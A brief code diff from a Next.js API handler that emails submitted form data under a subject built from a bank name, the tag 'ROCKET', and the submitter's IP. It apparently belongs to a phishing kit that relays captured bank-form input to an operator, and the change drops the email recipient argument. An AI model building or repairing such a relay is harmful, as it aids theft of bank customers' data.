@@ -45,7 +45,6 @@ handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
 
     if (process.env.TO) {
       await sendEmail(
-        process.env.TO as string,
         message,
         `${process.env.BANK_NAME} - ${form} by ROCKET 🚀🚀🚀 From ${ip}`,
         [
